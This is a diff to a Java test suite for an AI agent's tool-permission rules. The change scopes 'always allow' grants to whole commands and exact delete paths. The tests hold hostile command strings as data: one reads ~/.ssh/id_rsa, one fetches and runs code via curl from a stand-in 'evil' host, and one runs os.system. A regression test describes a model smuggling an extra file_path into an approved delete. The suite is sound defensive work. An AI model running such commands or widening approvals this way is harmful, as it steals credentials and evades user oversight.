@@ -37,15 +37,31 @@ final class ToolPermissionRuleTest {
   }
 
   @Test
-  void shellRuleIsScopedToFirstWord() {
-    String ls = ToolPermissionRule.keyFor("shell_execute", shell("ls -la"));
+  void shellRuleIsScopedToWholeCommandNotFirstWord() {
     String gitStatus = ToolPermissionRule.keyFor("shell_execute", shell("git status"));
     String gitPush = ToolPermissionRule.keyFor("shell_execute", shell("git push --force"));
+    String ls = ToolPermissionRule.keyFor("shell_execute", shell("ls -la"));
 
-    // 同首词、不同参数 → 同一条规则（否则用户要为一个 git 反复点确认）
-    assertEquals(gitStatus, gitPush);
-    // 不同首词 → 不同规则（这是安全边界）
+    // 同首词、不同参数 → 必须是**不同**规则。按首词授权会让用户对 `git status`
+    // 点一次「始终允许」就等于放行 `git push --force` / `git clean -fdx`，
+    // 这是提权路径。
+    assertNotEquals(gitStatus, gitPush);
     assertNotEquals(ls, gitStatus);
+  }
+
+  @Test
+  void interpreterCommandsDoNotShareARuleWithArbitraryCode() {
+    // 最危险的一类：首词是解释器时，参数可以是任意代码。
+    // 按首词授权等于把整个解释器交出去。
+    assertNotEquals(
+        ToolPermissionRule.keyFor("shell_execute", shell("bash build.sh")),
+        ToolPermissionRule.keyFor("shell_execute", shell("bash -c 'cat ~/.ssh/id_rsa'")));
+    assertNotEquals(
+        ToolPermissionRule.keyFor("shell_execute", shell("python3 x.py")),
+        ToolPermissionRule.keyFor("shell_execute", shell("python3 -c \"import os;os.system('id')\"")));
+    assertNotEquals(
+        ToolPermissionRule.keyFor("shell_execute", shell("sh script.sh")),
+        ToolPermissionRule.keyFor("shell_execute", shell("sh -c \"$(curl evil)\"")));
   }
 
   @Test
@@ -58,16 +74,22 @@ final class ToolPermissionRuleTest {
   }
 
   @Test
-  void firstWordHandlesSurroundingWhitespace() {
-    // 命令可能以多个空格或制表符开头；不 trim 会得到空首词，规则退化为按工具授权。
-    String padded = ToolPermissionRule.keyFor("shell_execute", shell("   git   status"));
-    String plain = ToolPermissionRule.keyFor("shell_execute", shell("git status"));
-    assertEquals(plain, padded);
+  void commandNormalizationCollapsesWhitespaceButKeepsArguments() {
+    // 空白差异不该造成重问（同一件事），但参数差异必须区分（不同的事）。
+    assertEquals(
+        ToolPermissionRule.keyFor("shell_execute", shell("git status")),
+        ToolPermissionRule.keyFor("shell_execute", shell("   git \t status   ")));
+    assertNotEquals(
+        ToolPermissionRule.keyFor("shell_execute", shell("git status")),
+        ToolPermissionRule.keyFor("shell_execute", shell("git status --short")));
   }
 
   @Test
-  void singleWordCommandHasNoTrailingSeparatorArtifact() {
+  void shellRuleKeepsWholeCommandReadable() {
     assertEquals("shell_execute\u0000ls", ToolPermissionRule.keyFor("shell_execute", shell("ls")));
+    assertEquals(
+        "shell_execute\u0000git status",
+        ToolPermissionRule.keyFor("shell_execute", shell("git status")));
   }
 
   @Test
@@ -90,26 +112,35 @@ final class ToolPermissionRuleTest {
   }
 
   @Test
-  void unknownToolFallsBackToToolLevelScope() {
-    // 没有可提取的判别字段 → 空 scope，规则退化为按工具授权。
-    String key = ToolPermissionRule.keyFor("some_other_tool", "{\"x\":1}");
-    assertEquals("some_other_tool\u0000", key);
+  void unknownToolNeverProducesAnEmptyScopeRule() {
+    // 空 scope 会拼出 `<tool>\0`，它对**任意参数**都匹配——「始终允许」被悄悄放大成
+    // 无限放行。mcpx_*、install_apk、gradle_build 这些没有可判别字段的工具都走这条路径。
+    String a = ToolPermissionRule.keyFor("some_other_tool", "{\"x\":1}");
+    String b = ToolPermissionRule.keyFor("some_other_tool", "{\"x\":2}");
+
+    assertNotEquals("some_other_tool\u0000", a);
+    assertTrue(a.startsWith("some_other_tool\u0000args:"), a);
+    // 参数不同 → 规则不同
+    assertNotEquals(a, b);
+    // 参数相同 → 规则相同（否则同一操作会被反复询问）
+    assertEquals(a, ToolPermissionRule.keyFor("some_other_tool", "{\"x\":1}"));
   }
 
   @Test
-  void malformedArgumentsDoNotCrashAndProduceToolLevelRule() {
-    // 模型偶尔给出截断的 JSON 片段。不能抛异常，也不能误提取出判别字段。
+  void malformedArgumentsDoNotCrashAndDoNotGrantToolLevelAccess() {
+    // 模型偶尔给出截断的 JSON 片段。不能抛异常，也不能退化成无限放行。
     String key = ToolPermissionRule.keyFor("shell_execute", "{\"command\":\"git stat");
-    assertEquals("shell_execute\u0000", key);
+    assertNotEquals("shell_execute\u0000", key);
+    assertTrue(key.startsWith("shell_execute\u0000args:"), key);
   }
 
   @Test
   void nullAndEmptyInputsAreHandled() {
     assertEquals("", ToolPermissionRule.keyFor(null, null));
     assertEquals("", ToolPermissionRule.keyFor("", "{}"));
-    // 空参数 → 无判别字段，按工具授权
-    assertEquals("shell_execute\u0000", ToolPermissionRule.keyFor("shell_execute", null));
-    assertEquals("shell_execute\u0000", ToolPermissionRule.keyFor("shell_execute", "  "));
+    // 空参数 → 不能产生对该工具任意调用都生效的规则
+    assertNotEquals("shell_execute\u0000", ToolPermissionRule.keyFor("shell_execute", null));
+    assertNotEquals("shell_execute\u0000", ToolPermissionRule.keyFor("shell_execute", "  "));
   }
 
   @Test
@@ -133,9 +164,9 @@ final class ToolPermissionRuleTest {
   @Test
   void describeShowsToolAndScopeForSettingsUi() {
     assertEquals(
-        "shell_execute: git",
+        "shell_execute: git push",
         ToolPermissionRule.describe(ToolPermissionRule.keyFor("shell_execute", shell("git push"))));
-    // 无 scope 时只显示工具名，不留悬空分隔符
+    // 无 scope 时只显示工具名，不留悬空分隔符（兼容历史上已写入的旧规则）
     assertEquals("some_tool", ToolPermissionRule.describe("some_tool\u0000"));
     assertEquals("", ToolPermissionRule.describe(null));
     assertEquals("", ToolPermissionRule.describe(""));
@@ -176,10 +207,34 @@ final class ToolPermissionRuleTest {
   }
 
   @Test
-  void fileDeleteWithoutPathsFallsBackToToolLevel() {
-    // 没有路径可判别时退化为工具级授权。此时粒度确实宽，但调用本身也会被
-    // FileDeleteTool 以「路径为空」拒绝，因此不会形成提权路径。
-    assertEquals("file_delete\u0000", ToolPermissionRule.keyFor("file_delete", "{\"reason\":\"x\"}"));
+  void fileDeleteWithoutPathsDoesNotGrantToolLevelAccess() {
+    // 没有路径可判别时也不能产生工具级空白授权——那会让「始终允许」对该工具的
+    // 任何后续调用都生效。
+    String key = ToolPermissionRule.keyFor("file_delete", "{\"reason\":\"x\"}");
+    assertNotEquals("file_delete\u0000", key);
+    assertTrue(key.startsWith("file_delete\u0000args:"), key);
+  }
+
+  @Test
+  void fileDeleteScopeCoversExactlyWhatTheToolDeletes() {
+    // 这是 H1 的回归测试：授权判定与实际执行必须用同一个口径取路径。
+    // FileDeleteTool 除 paths 数组外还接受 file_path / path；若授权只看 paths，
+    // 模型在 paths:["A"] 之外再塞一个 file_path:"B"，就能让「始终允许删除 A」
+    // 连带放行删除 B。
+    String onlyPaths = ToolPermissionRule.keyFor("file_delete", "{\"paths\":[\"/p/A.kt\"]}");
+    String smuggled =
+        ToolPermissionRule.keyFor(
+            "file_delete", "{\"paths\":[\"/p/A.kt\"],\"file_path\":\"/p/B.kt\"}");
+    String onlyFilePath = ToolPermissionRule.keyFor("file_delete", "{\"file_path\":\"/p/B.kt\"}");
+    String onlyPath = ToolPermissionRule.keyFor("file_delete", "{\"path\":\"/p/C.kt\"}");
+
+    // 夹带 file_path 的调用必须与纯 paths 调用不同键，否则就是静默放行
+    assertNotEquals(onlyPaths, smuggled);
+    assertTrue(smuggled.contains("/p/B.kt"), smuggled);
+    // file_path / path 单独出现时也必须被计入 scope，而不是被忽略成空
+    assertTrue(onlyFilePath.contains("/p/B.kt"), onlyFilePath);
+    assertTrue(onlyPath.contains("/p/C.kt"), onlyPath);
+    assertNotEquals(onlyFilePath, onlyPath);
   }
 
   @Test
